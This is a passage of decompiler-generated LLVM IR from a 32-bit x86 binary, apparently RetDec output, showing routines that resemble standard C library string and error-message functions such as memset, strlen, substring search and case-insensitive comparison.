  %v7_8051f22 = select i1 %v6_8051f22, i32 -1, i32 1
  %v8_8051f22 = add i32 %v7_8051f22, %v5_8051f22
  store i32 %v8_8051f22, i32* %edi.global-to-local, align 4
  %v6_8051f23 = icmp eq i8 %v2_8051f21, 0
  %v1_8051f25 = icmp eq i1 %v6_8051f23, false
  %v0_8051f1e.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_8051f25, label %dec_label_pc_8051f1e, label %dec_label_pc_8051f27

dec_label_pc_8051f27:                             ; preds = %dec_label_pc_8051f21
  %v1_8051f27 = add i32 %v0_8051f1e.pre, -1
  store i32 %v1_8051f27, i32* %ecx.global-to-local, align 4
  %v2_8051f28 = sext i8 %v2_8051f21 to i32
  %v4_8051f28 = inttoptr i32 %v8_8051f22 to i8*
  %v5_8051f28 = call i8* @_memset(i8* %v4_8051f28, i32 %v2_8051f28, i32 %v1_8051f27)
  %v6_8051f28 = ptrtoint i8* %v5_8051f28 to i32
  store i32 %v6_8051f28, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_8051f1e, %dec_label_pc_8051f27
  %v2_8051f2e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051f2e, i32* @edx, align 4
  %v2_8051f2f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051f2f, i32* @esi, align 4
  ret i32 %v4_8051f19

; uselistorder directives
  uselistorder i32 %v8_8051f22, { 0, 2, 1 }
  uselistorder i8 %v2_8051f21, { 0, 2, 1 }
  uselistorder i32 %v1_8051f1e, { 1, 0 }
  uselistorder i32 %v4_8051f19, { 1, 0, 2 }
  uselistorder i32* %ecx.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @function_8051f34() local_unnamed_addr {
dec_label_pc_8051f34:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_4()
  %v4_8051f34 = ptrtoint i8* %tmp4 to i32
  %v8_8051f478 = icmp eq i32 %tmp, 0
  %v1_8051f4810 = icmp eq i1 %v8_8051f478, false
  br i1 %v1_8051f4810, label %dec_label_pc_8051f41, label %dec_label_pc_8051f4a

dec_label_pc_8051f41:                             ; preds = %dec_label_pc_8051f34, %dec_label_pc_8051f46
  %v1_8051f4712 = phi i32 [ %v1_8051f47, %dec_label_pc_8051f46 ], [ %tmp, %dec_label_pc_8051f34 ]
  %v0_8051f4a11 = phi i32 [ %v1_8051f46, %dec_label_pc_8051f46 ], [ %v4_8051f34, %dec_label_pc_8051f34 ]
  %v1_8051f41 = inttoptr i32 %v0_8051f4a11 to i8*
  %v2_8051f41 = load i8, i8* %v1_8051f41, align 1
  %v3_8051f41 = icmp eq i8 %v2_8051f41, 0
  br i1 %v3_8051f41, label %dec_label_pc_8051f4a, label %dec_label_pc_8051f46

dec_label_pc_8051f46:                             ; preds = %dec_label_pc_8051f41
  %v1_8051f46 = add i32 %v0_8051f4a11, 1
  %v1_8051f47 = add i32 %v1_8051f4712, -1
  %v8_8051f47 = icmp eq i32 %v1_8051f47, 0
  %v1_8051f48 = icmp eq i1 %v8_8051f47, false
  br i1 %v1_8051f48, label %dec_label_pc_8051f41, label %dec_label_pc_8051f4a

dec_label_pc_8051f4a:                             ; preds = %dec_label_pc_8051f46, %dec_label_pc_8051f41, %dec_label_pc_8051f34
  %v0_8051f4a.lcssa = phi i32 [ %v4_8051f34, %dec_label_pc_8051f34 ], [ %v0_8051f4a11, %dec_label_pc_8051f41 ], [ %v1_8051f46, %dec_label_pc_8051f46 ]
  %v2_8051f4a = sub i32 %v0_8051f4a.lcssa, %v4_8051f34
  ret i32 %v2_8051f4a

; uselistorder directives
  uselistorder i32 %v1_8051f47, { 1, 0 }
  uselistorder i32 %v0_8051f4a11, { 0, 2, 1 }
  uselistorder i32 %v4_8051f34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051f41, { 1, 0 }
}

define i32 @function_8051f50(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_8051f50:
  %v0_8051f53 = load i32, i32* @ebx, align 4
  %v4_8051f57 = ptrtoint i8* %arg2 to i32
  %v2_8051f5f = load i8, i8* %arg2, align 1
  %v1_8051f62 = icmp eq i8 %v2_8051f5f, 0
  br i1 %v1_8051f62, label %dec_label_pc_8052016, label %dec_label_pc_8051f6d

dec_label_pc_8051f6d:                             ; preds = %dec_label_pc_8051f50
  %v1_8051f6d = add i32 %arg1, -1
  br label %dec_label_pc_8051f6e

dec_label_pc_8051f6e:                             ; preds = %dec_label_pc_8051f7a, %dec_label_pc_8051f6d
  %v0_8051f6e = phi i32 [ %v1_8051f6e, %dec_label_pc_8051f7a ], [ %v1_8051f6d, %dec_label_pc_8051f6d ]
  %v1_8051f6e = add i32 %v0_8051f6e, 1
  %v1_8051f6f = inttoptr i32 %v1_8051f6e to i8*
  %v2_8051f6f = load i8, i8* %v1_8051f6f, align 1
  %v1_8051f72 = icmp eq i8 %v2_8051f6f, 0
  br i1 %v1_8051f72, label %dec_label_pc_8052014, label %dec_label_pc_8051f7a

dec_label_pc_8051f7a:                             ; preds = %dec_label_pc_8051f6e
  %v14_8051f7a = icmp eq i8 %v2_8051f6f, %v2_8051f5f
  %v1_8051f7d = icmp eq i1 %v14_8051f7a, false
  br i1 %v1_8051f7d, label %dec_label_pc_8051f6e, label %dec_label_pc_8051f7f

dec_label_pc_8051f7f:                             ; preds = %dec_label_pc_8051f7a
  %v1_8051f7f = add i32 %v4_8051f57, 1
  %v2_8051f86 = inttoptr i32 %v1_8051f7f to i8*
  %v3_8051f86 = load i8, i8* %v2_8051f86, align 1
  %v1_8051f8a = icmp eq i8 %v3_8051f86, 0
  br i1 %v1_8051f8a, label %dec_label_pc_8052016, label %dec_label_pc_8051f92

dec_label_pc_8051f92:                             ; preds = %dec_label_pc_8051f7f
  %v1_8051f92 = add i32 %v0_8051f6e, 2
  %v1_8051fdc = add i32 %v4_8051f57, 2
  %v2_8051fdc = inttoptr i32 %v1_8051fdc to i8*
  br label %dec_label_pc_8051fc8

dec_label_pc_8051f9d:                             ; preds = %dec_label_pc_805200c
  %v2_8051f9d = inttoptr i32 %v0_8051fce to i8*
  %v3_8051f9d = load i8, i8* %v2_8051f9d, align 1
  br label %dec_label_pc_8051fbb.preheader

dec_label_pc_8051fbb.preheader:                   ; preds = %dec_label_pc_8051f9d, %dec_label_pc_8051fc8
  %v0_8051fa6.ph.in = phi i8 [ %v4_8051f92.sink.in, %dec_label_pc_8051fc8 ], [ %v3_8051f9d, %dec_label_pc_8051f9d ]
  %v14_8051fbb44 = icmp eq i8 %v0_8051fa6.ph.in, %v2_8051f5f
  %v1_8051fbe46 = icmp eq i1 %v14_8051fbb44, false
  br i1 %v1_8051fbe46, label %dec_label_pc_8051fa6, label %dec_label_pc_8051fc0

dec_label_pc_8051fa6:                             ; preds = %dec_label_pc_8051fbb.preheader, %dec_label_pc_8051fb7
  %v0_8051fa648.in = phi i8 [ %v2_8051fb8, %dec_label_pc_8051fb7 ], [ %v0_8051fa6.ph.in, %dec_label_pc_8051fbb.preheader ]
  %v0_8051faa47 = phi i32 [ %v1_8051fb7, %dec_label_pc_8051fb7 ], [ %v0_8051fce, %dec_label_pc_8051fbb.preheader ]
  %v1_8051fa6 = icmp eq i8 %v0_8051fa648.in, 0
  br i1 %v1_8051fa6, label %dec_label_pc_8052014, label %dec_label_pc_8051faa

dec_label_pc_8051faa:                             ; preds = %dec_label_pc_8051fa6
  %v1_8051faa = add i32 %v0_8051faa47, 1
  %v1_8051fab = inttoptr i32 %v1_8051faa to i8*
  %v2_8051fab = load i8, i8* %v1_8051fab, align 1
  %v14_8051fae = icmp eq i8 %v2_8051fab, %v2_8051f5f
  br i1 %v14_8051fae, label %dec_label_pc_8051fc0, label %dec_label_pc_8051fb3

dec_label_pc_8051fb3:                             ; preds = %dec_label_pc_8051faa
  %v1_8051fb3 = icmp eq i8 %v2_8051fab, 0
  br i1 %v1_8051fb3, label %dec_label_pc_8052014, label %dec_label_pc_8051fb7

dec_label_pc_8051fb7:                             ; preds = %dec_label_pc_8051fb3
  %v1_8051fb7 = add i32 %v0_8051faa47, 2
  %v1_8051fb8 = inttoptr i32 %v1_8051fb7 to i8*
  %v2_8051fb8 = load i8, i8* %v1_8051fb8, align 1
  %v14_8051fbb = icmp eq i8 %v2_8051fb8, %v2_8051f5f
  %v1_8051fbe = icmp eq i1 %v14_8051fbb, false
  br i1 %v1_8051fbe, label %dec_label_pc_8051fa6, label %dec_label_pc_8051fc0

dec_label_pc_8051fc0:                             ; preds = %dec_label_pc_8051fb7, %dec_label_pc_8051faa, %dec_label_pc_8051fbb.preheader
  %v0_8051fc0 = phi i32 [ %v0_8051fce, %dec_label_pc_8051fbb.preheader ], [ %v1_8051faa, %dec_label_pc_8051faa ], [ %v1_8051fb7, %dec_label_pc_8051fb7 ]
  %v1_8051fc0 = add i32 %v0_8051fc0, 1
  br label %dec_label_pc_8051fc8

dec_label_pc_8051fc8:                             ; preds = %dec_label_pc_8051f92, %dec_label_pc_8051fc0
  %v0_8051fce = phi i32 [ %v1_8051f92, %dec_label_pc_8051f92 ], [ %v1_8051fc0, %dec_label_pc_8051fc0 ]
  %v4_8051f92.sink.in.in.in = phi i32 [ %v1_8051f92, %dec_label_pc_8051f92 ], [ %v1_8051fc0, %dec_label_pc_8051fc0 ]
  %v4_8051f92.sink.in.in = inttoptr i32 %v4_8051f92.sink.in.in.in to i8*
  %v4_8051f92.sink.in = load i8, i8* %v4_8051f92.sink.in.in, align 1
  %storemerge4 = icmp eq i8 %v4_8051f92.sink.in, %v3_8051f86
  %v1_8051fc8 = icmp eq i1 %storemerge4, false
  br i1 %v1_8051fc8, label %dec_label_pc_8051fbb.preheader, label %dec_label_pc_8051fca

dec_label_pc_8051fca:                             ; preds = %dec_label_pc_8051fc8
  %v1_8051fce = add i32 %v0_8051fce, 1
  %v1_8051fd5 = add i32 %v0_8051fce, -1
  %v2_8051fd8 = inttoptr i32 %v1_8051fce to i8*
  %v3_8051fd8 = load i8, i8* %v2_8051fd8, align 1
  %v4_8051fd8 = zext i8 %v3_8051fd8 to i32
  %v3_8051fdc = load i8, i8* %v2_8051fdc, align 1
  %v4_8051fdc = zext i8 %v3_8051fdc to i32
  %v12_8051fe1 = icmp eq i8 %v3_8051fd8, %v3_8051fdc
  %v1_8051fe3 = icmp eq i1 %v12_8051fe1, false
  br i1 %v1_8051fe3, label %dec_label_pc_805200c, label %dec_label_pc_8051fe5

dec_label_pc_8051fe5:                             ; preds = %dec_label_pc_8051fca, %dec_label_pc_8051ff9
  %v0_8051ffc = phi i32 [ %v1_8051ffc, %dec_label_pc_8051ff9 ], [ %v1_8051fdc, %dec_label_pc_8051fca ]
  %v0_8051ff9 = phi i32 [ %v1_8051ff9, %dec_label_pc_8051ff9 ], [ %v1_8051fce, %dec_label_pc_8051fca ]
  %v0_8051fe5 = phi i32 [ %v3_8051fff, %dec_label_pc_8051ff9 ], [ %v4_8051fd8, %dec_label_pc_8051fca ]
  %v1_8051fe5 = icmp eq i32 %v0_8051fe5, 0
  br i1 %v1_8051fe5, label %dec_label_pc_8052016, label %dec_label_pc_8051fe9

dec_label_pc_8051fe9:                             ; preds = %dec_label_pc_8051fe5
  %v1_8051fe9 = add i32 %v0_8051ff9, 1
  %v2_8051fe9 = inttoptr i32 %v1_8051fe9 to i8*
  %v3_8051fe9 = load i8, i8* %v2_8051fe9, align 1
  %v1_8051fed = add i32 %v0_8051ffc, 1
  %v2_8051fed = inttoptr i32 %v1_8051fed to i8*
  %v3_8051fed = load i8, i8* %v2_8051fed, align 1
  %v4_8051fed = zext i8 %v3_8051fed to i32
  %v12_8051ff1 = icmp eq i8 %v3_8051fe9, %v3_8051fed
  %v1_8051ff3 = icmp eq i1 %v12_8051ff1, false
  br i1 %v1_8051ff3, label %dec_label_pc_805200c, label %dec_label_pc_8051ff5

dec_label_pc_8051ff5:                             ; preds = %dec_label_pc_8051fe9
  %v1_8051ff5 = icmp eq i8 %v3_8051fed, 0
  br i1 %v1_8051ff5, label %dec_label_pc_8052016, label %dec_label_pc_8051ff9

dec_label_pc_8051ff9:                             ; preds = %dec_label_pc_8051ff5
  %v1_8051ff9 = add i32 %v0_8051ff9, 2
  %v1_8051ffc = add i32 %v0_8051ffc, 2
  %v1_8051fff = inttoptr i32 %v1_8051ffc to i8*
  %v2_8051fff = load i8, i8* %v1_8051fff, align 1
  %v3_8051fff = zext i8 %v2_8051fff to i32
  %v1_8052003 = inttoptr i32 %v1_8051ff9 to i8*
  %v2_8052003 = load i8, i8* %v1_8052003, align 1
  %v12_8052006 = icmp eq i8 %v2_8052003, %v2_8051fff
  br i1 %v12_8052006, label %dec_label_pc_8051fe5, label %dec_label_pc_805200a

dec_label_pc_805200a:                             ; preds = %dec_label_pc_8051ff9
  br label %dec_label_pc_805200c

dec_label_pc_805200c:                             ; preds = %dec_label_pc_8051fe9, %dec_label_pc_8051fca, %dec_label_pc_805200a
  %v0_805200c = phi i32 [ %v4_8051fdc, %dec_label_pc_8051fca ], [ %v3_8051fff, %dec_label_pc_805200a ], [ %v4_8051fed, %dec_label_pc_8051fe9 ]
  %v1_805200c = icmp eq i32 %v0_805200c, 0
  %v1_805200e = icmp eq i1 %v1_805200c, false
  br i1 %v1_805200e, label %dec_label_pc_8051f9d, label %dec_label_pc_8052016

dec_label_pc_8052014:                             ; preds = %dec_label_pc_8051f6e, %dec_label_pc_8051fb3, %dec_label_pc_8051fa6
  br label %dec_label_pc_8052016

dec_label_pc_8052016:                             ; preds = %dec_label_pc_805200c, %dec_label_pc_8051fe5, %dec_label_pc_8051ff5, %dec_label_pc_8051f50, %dec_label_pc_8051f7f, %dec_label_pc_8052014
  %storemerge2 = phi i32 [ 0, %dec_label_pc_8052014 ], [ %v1_8051f6e, %dec_label_pc_8051f7f ], [ %arg1, %dec_label_pc_8051f50 ], [ %v1_8051fd5, %dec_label_pc_8051ff5 ], [ %v1_8051fd5, %dec_label_pc_8051fe5 ], [ %v1_8051fd5, %dec_label_pc_805200c ]
  store i32 %v0_8051f53, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_8051ffc, { 1, 0 }
  uselistorder i32 %v1_8051ff9, { 1, 0 }
  uselistorder i8 %v3_8051fed, { 1, 0, 2 }
  uselistorder i8 %v4_8051f92.sink.in, { 1, 0 }
  uselistorder i32 %v0_8051fce, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v2_8051fb8, { 1, 0 }
  uselistorder i32 %v1_8051fb7, { 0, 2, 1 }
  uselistorder i8 %v2_8051fab, { 1, 0 }
  uselistorder i32 %v0_8051faa47, { 1, 0 }
  uselistorder i32 %v1_8051f6e, { 0, 2, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052016, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8052014, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805200c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051fe5, { 1, 0 }
  uselistorder label %dec_label_pc_8051fc8, { 1, 0 }
  uselistorder label %dec_label_pc_8051fa6, { 1, 0 }
  uselistorder label %dec_label_pc_8051fbb.preheader, { 1, 0 }
}

define i32 @function_8052020() local_unnamed_addr {
dec_label_pc_8052020:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_8052031 = call i32 @function_8052040(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_8052039 = load i32, i32* @ebx, align 4
  ret i32 %v0_8052039
}

define i32 @function_8052040(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052040:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_8052052 = icmp ugt i32 %arg1, 124
  br i1 %v6_8052052, label %dec_label_pc_805206f, label %dec_label_pc_8052054

dec_label_pc_8052054:                             ; preds = %dec_label_pc_8052040
  store i32 ptrtoint ([8 x i8]* @global_var_805c160.320 to i32), i32* @esi, align 4
  %v1_80520644 = icmp eq i32 %arg1, 0
  %v1_805206611 = icmp eq i1 %v1_80520644, false
  br i1 %v1_805206611, label %dec_label_pc_805205d, label %dec_label_pc_8052068

dec_label_pc_805205d:                             ; preds = %dec_label_pc_8052054, %dec_label_pc_805205d
  %v0_8052060 = phi i32 [ %v3_8052060, %dec_label_pc_805205d ], [ %arg1, %dec_label_pc_8052054 ]
  %v0_8052063 = phi i32 [ %v1_8052063, %dec_label_pc_805205d ], [ ptrtoint ([8 x i8]* @global_var_805c160.320 to i32), %dec_label_pc_8052054 ]
  %v1_805205d = inttoptr i32 %v0_8052063 to i8*
  %v2_805205d = load i8, i8* %v1_805205d, align 1
  %v7_805205d = icmp eq i8 %v2_805205d, 0
  %v2_8052060 = zext i1 %v7_805205d to i32
  %v3_8052060 = add i32 %v2_8052060, %v0_8052060
  %v16_8052060 = icmp eq i32 %v3_8052060, 0
  %v1_8052063 = add i32 %v0_8052063, 1
  store i32 %v1_8052063, i32* @esi, align 4
  %v1_8052066 = icmp eq i1 %v16_8052060, false
  br i1 %v1_8052066, label %dec_label_pc_805205d, label %dec_label_pc_8052068

dec_label_pc_8052068:                             ; preds = %dec_label_pc_805205d, %dec_label_pc_8052054
  %v0_805206a = phi i32 [ ptrtoint ([8 x i8]* @global_var_805c160.320 to i32), %dec_label_pc_8052054 ], [ %v1_8052063, %dec_label_pc_805205d ]
  store i32 0, i32* @ebp, align 4
  %v1_805206a = inttoptr i32 %v0_805206a to i8*
  %v2_805206a = load i8, i8* %v1_805206a, align 1
  %v3_805206a = icmp eq i8 %v2_805206a, 0
  %v1_805206d = icmp eq i1 %v3_805206a, false
  br i1 %v1_805206d, label %dec_label_pc_8052068.dec_label_pc_805209e_crit_edge, label %dec_label_pc_805206f

dec_label_pc_8052068.dec_label_pc_805209e_crit_edge: ; preds = %dec_label_pc_8052068
  br label %dec_label_pc_805209e

dec_label_pc_805206f:                             ; preds = %dec_label_pc_8052068, %dec_label_pc_8052040
  %v1_8052072 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_8052083 = bitcast i32* %stack_var_-17 to i8*
  %v7_8052083 = call i32 @function_80549cc(i8* %v6_8052083, i32 %arg1, i32 %v1_8052072, i32 -10, i32 0)
  %v1_8052092 = add i32 %v7_8052083, -14
  store i32 %v1_8052092, i32* @esi, align 4
  %v5_8052095 = inttoptr i32 %v1_8052092 to i8*
  store i8* %v5_8052095, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_8052092 to i16*
  %v6_8052096 = call i32 @function_8051e5c(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_805c136.321 to i32), i32 14)
  %v1_80520a8.pre = load i32, i32* @edi, align 4
  %v0_80520ae.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805209e

dec_label_pc_805209e:                             ; preds = %dec_label_pc_8052068.dec_label_pc_805209e_crit_edge, %dec_label_pc_805206f
  %v0_80520ae = phi i32 [ %v0_805206a, %dec_label_pc_8052068.dec_label_pc_805209e_crit_edge ], [ %v0_80520ae.pre, %dec_label_pc_805206f ]
  %v1_80520a8 = phi i32 [ %arg3, %dec_label_pc_8052068.dec_label_pc_805209e_crit_edge ], [ %v1_80520a8.pre, %dec_label_pc_805206f ]
  %v4_805209e = icmp eq i32 %arg2, 0
  %v3_80520a8 = select i1 %v4_805209e, i32 0, i32 %v1_80520a8
  store i32 %v3_80520a8, i32* @edi, align 4
  %v5_80520ae = inttoptr i32 %v0_80520ae to i8*
  store i8* %v5_80520ae, i8** %stack_var_-108, align 4
  %v3_80520af = call i32 @function_8051ef8(i8* %v5_80520ae)
  %v1_80520b7 = add i32 %v3_80520af, 1
  store i32 %v1_80520b7, i32* %ebx.global-to-local, align 4
  %v1_80520ba = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_80520b7, %v1_80520ba
  br i1 %tmp, label %dec_label_pc_80520be, label %dec_label_pc_80520c5

dec_label_pc_80520be:                             ; preds = %dec_label_pc_805209e
  store i32 %v1_80520ba, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_80520c5

dec_label_pc_80520c5:                             ; preds = %dec_label_pc_805209e, %dec_label_pc_80520be
  %v0_80520ca = phi i32 [ %v1_80520b7, %dec_label_pc_805209e ], [ %v1_80520ba, %dec_label_pc_80520be ]
  %v1_80520c5 = icmp eq i32 %v0_80520ca, 0
  br i1 %v1_80520c5, label %dec_label_pc_80520e1, label %dec_label_pc_80520c9

dec_label_pc_80520c9:                             ; preds = %dec_label_pc_80520c5
  %v0_80520cb = load i32, i32* @esi, align 4
  %v8_80520cc = inttoptr i32 %arg2 to i8*
  store i8* %v8_80520cc, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_80520d0 = call i32 @function_8051e5c(i16* %tmp45, i32 %v0_80520cb, i32 %v0_80520ca)
  %v1_80520dc = load i32, i32* %ebx.global-to-local, align 4
  %v2_80520dc = add i32 %arg2, -1
  %v3_80520dc = add i32 %v2_80520dc, %v1_80520dc
  %v4_80520dc = inttoptr i32 %v3_80520dc to i8*
  store i8 0, i8* %v4_80520dc, align 1
  br label %dec_label_pc_80520e1

dec_label_pc_80520e1:                             ; preds = %dec_label_pc_80520c5, %dec_label_pc_80520c9
  %v0_80520e1 = load i32, i32* @ebp, align 4
  %v1_80520e1 = icmp eq i32 %v0_80520e1, 0
  br i1 %v1_80520e1, label %dec_label_pc_80520ec, label %dec_label_pc_80520e5

dec_label_pc_80520e5:                             ; preds = %dec_label_pc_80520e1
  %v0_80520e5 = load i8*, i8** %stack_var_-108, align 4
  %v1_80520e5 = ptrtoint i8* %v0_80520e5 to i32
  %v2_80520e5 = call i32 @function_8050f90(i32 %v1_80520e5)
  %v0_80520ea = load i32, i32* @ebp, align 4
  %v2_80520ea = inttoptr i32 %v2_80520e5 to i32*
  store i32 %v0_80520ea, i32* %v2_80520ea, align 4
  %v0_80520ef.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80520ec

dec_label_pc_80520ec:                             ; preds = %dec_label_pc_80520e1, %dec_label_pc_80520e5
  %v0_80520ef = phi i32 [ 0, %dec_label_pc_80520e1 ], [ %v0_80520ef.pre, %dec_label_pc_80520e5 ]
  ret i32 %v0_80520ef

; uselistorder directives
  uselistorder i32 %v1_80520ba, { 1, 2, 0 }
  uselistorder i32 %v1_80520b7, { 1, 0, 2 }
  uselistorder i32 %v1_8052063, { 0, 2, 1 }
  uselistorder i32 %v3_8052060, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_805c160.320 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_80520ec, { 1, 0 }
  uselistorder label %dec_label_pc_80520e1, { 1, 0 }
  uselistorder label %dec_label_pc_80520c5, { 1, 0 }
  uselistorder label %dec_label_pc_805209e, { 1, 0 }
  uselistorder label %dec_label_pc_805205d, { 1, 0 }
}

define i32 @function_80520f8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80520f8:
  %v2_8052108 = inttoptr i32 %arg2 to i8*
  %v3_8052108 = call i32 @function_80550f4(i8* %v2_8052108, i32 %arg1)
  ret i32 %v3_8052108
}

define i32 @function_8052110(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052110:
  %v0_8052113 = load i32, i32* @ebx, align 4
  %v4_8052117 = ptrtoint i8* %arg1 to i32
  %v1_805212319 = inttoptr i32 %arg2 to i8*
  %v2_80521232033 = load i8, i8* %v1_805212319, align 1
  %v4_80521252437 = icmp eq i8 %v2_80521232033, 0
  %v1_80521272639 = icmp eq i1 %v4_80521252437, false
  br i1 %v1_80521272639, label %dec_label_pc_805212d.lr.ph.lr.ph, label %dec_label_pc_805215d

dec_label_pc_805212d.lr.ph.lr.ph:                 ; preds = %dec_label_pc_8052110
  %v3_80521232134 = zext i8 %v2_80521232033 to i32
  %v4_8052123.pre.pre = load i32, i32* @eax, align 4
  %v5_80521232235 = and i32 %v4_8052123.pre.pre, -256
  %v6_80521232336 = or i32 %v3_80521232134, %v5_80521232235
  %v4_805212d.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805212d.lr.ph

dec_label_pc_805212d.lr.ph:                       ; preds = %dec_label_pc_805212d.lr.ph.lr.ph, %dec_label_pc_8052158
  %v4_805212d.pre = phi i32 [ %v4_805212d.pre.pre, %dec_label_pc_805212d.lr.ph.lr.ph ], [ %v0_8052137, %dec_label_pc_8052158 ]
  %v6_80521232342 = phi i32 [ %v6_80521232336, %dec_label_pc_805212d.lr.ph.lr.ph ], [ %v6_805212323, %dec_label_pc_8052158 ]
  %v2_80521232041 = phi i8 [ %v2_80521232033, %dec_label_pc_805212d.lr.ph.lr.ph ], [ %v2_805212320, %dec_label_pc_8052158 ]
  %v0_805215840 = phi i32 [ %v4_8052117, %dec_label_pc_805212d.lr.ph.lr.ph ], [ %v1_8052158, %dec_label_pc_8052158 ]
  br label %dec_label_pc_805212d

dec_label_pc_805212d:                             ; preds = %dec_label_pc_805212d.lr.ph, %dec_label_pc_805214d
  %v4_805212d = phi i32 [ %v4_805212d.pre, %dec_label_pc_805212d.lr.ph ], [ %v4_805212d47, %dec_label_pc_805214d ]
  %v6_805212331 = phi i32 [ %v6_80521232342, %dec_label_pc_805212d.lr.ph ], [ %v6_8052123, %dec_label_pc_805214d ]
  %v2_805212330 = phi i8 [ %v2_80521232041, %dec_label_pc_805212d.lr.ph ], [ %v2_8052123, %dec_label_pc_805214d ]
  %v1_805212329 = phi i8* [ %v1_805212319, %dec_label_pc_805212d.lr.ph ], [ %v1_8052123, %dec_label_pc_805214d ]
  %v0_805214d28 = phi i32 [ %arg2, %dec_label_pc_805212d.lr.ph ], [ %v1_805214d, %dec_label_pc_805214d ]
  %v0_805214e27 = phi i32 [ %v0_805215840, %dec_label_pc_805212d.lr.ph ], [ %v1_805214e, %dec_label_pc_805214d ]
  %v1_805212d = inttoptr i32 %v0_805214e27 to i8*
  %v2_805212d = load i8, i8* %v1_805212d, align 1
  %v3_805212d = zext i8 %v2_805212d to i32
  %v5_805212d = and i32 %v4_805212d, -256
  %v6_805212d = or i32 %v5_805212d, %v3_805212d
  %v15_805212f = icmp eq i8 %v2_805212330, %v2_805212d
  br i1 %v15_805212f, label %dec_label_pc_805214d, label %dec_label_pc_8052137

dec_label_pc_8052137:                             ; preds = %dec_label_pc_805212d
  %v0_8052137 = load i32, i32* bitcast (i32** @global_var_805e880.323 to i32*), align 128
  %v2_805213d = load i8, i8* %v1_805212d, align 1
  %v3_805213d = zext i8 %v2_805213d to i32
  %v2_8052140 = load i8, i8* %v1_805212329, align 1
  %v3_8052140 = zext i8 %v2_8052140 to i32
  %v2_8052143 = mul nuw nsw i32 %v3_805213d, 2
  %v3_8052143 = add i32 %v2_8052143, %v0_8052137
  %v4_8052143 = inttoptr i32 %v3_8052143 to i16*
  %v5_8052143 = load i16, i16* %v4_8052143, align 2
  %v6_8052143 = zext i16 %v5_8052143 to i32
  %v4_8052147 = mul nuw nsw i32 %v3_8052140, 2
  %v5_8052147 = add i32 %v4_8052147, %v0_8052137
  %v6_8052147 = inttoptr i32 %v5_8052147 to i16*
  %v7_8052147 = load i16, i16* %v6_8052147, align 2
  %v18_8052147 = icmp eq i16 %v5_8052143, %v7_8052147
  %v1_805214b = icmp eq i1 %v18_8052147, false
  br i1 %v1_805214b, label %dec_label_pc_8052151, label %dec_label_pc_805214d

dec_label_pc_805214d:                             ; preds = %dec_label_pc_8052137, %dec_label_pc_805212d
  %v4_805212d47 = phi i32 [ %v0_8052137, %dec_label_pc_8052137 ], [ %v6_805212d, %dec_label_pc_805212d ]
  %v4_80521237 = phi i32 [ %v6_8052143, %dec_label_pc_8052137 ], [ %v6_805212331, %dec_label_pc_805212d ]
  %v1_805214d = add i32 %v0_805214d28, 1
  %v1_805214e = add i32 %v0_805214e27, 1
  %v1_8052123 = inttoptr i32 %v1_805214d to i8*
  %v2_8052123 = load i8, i8* %v1_8052123, align 1
  %v3_8052123 = zext i8 %v2_8052123 to i32
  %v5_8052123 = and i32 %v4_80521237, -256
  %v6_8052123 = or i32 %v3_8052123, %v5_8052123
  %v4_8052125 = icmp eq i8 %v2_8052123, 0
  %v1_8052127 = icmp eq i1 %v4_8052125, false
  br i1 %v1_8052127, label %dec_label_pc_805212d, label %dec_label_pc_805215d

dec_label_pc_8052151:                             ; preds = %dec_label_pc_8052137
  %v4_8052151 = icmp eq i8 %v2_805212d, 0
  br i1 %v4_8052151, label %dec_label_pc_805215b, label %dec_label_pc_8052158

dec_label_pc_8052158:                             ; preds = %dec_label_pc_8052151
  %v1_8052158 = add i32 %v0_805215840, 1
  %v2_805212320 = load i8, i8* %v1_805212319, align 1
  %v3_805212321 = zext i8 %v2_805212320 to i32
  %v5_805212322 = and i32 %v6_8052143, 65280
  %v6_805212323 = or i32 %v3_805212321, %v5_805212322
  %v4_805212524 = icmp eq i8 %v2_805212320, 0
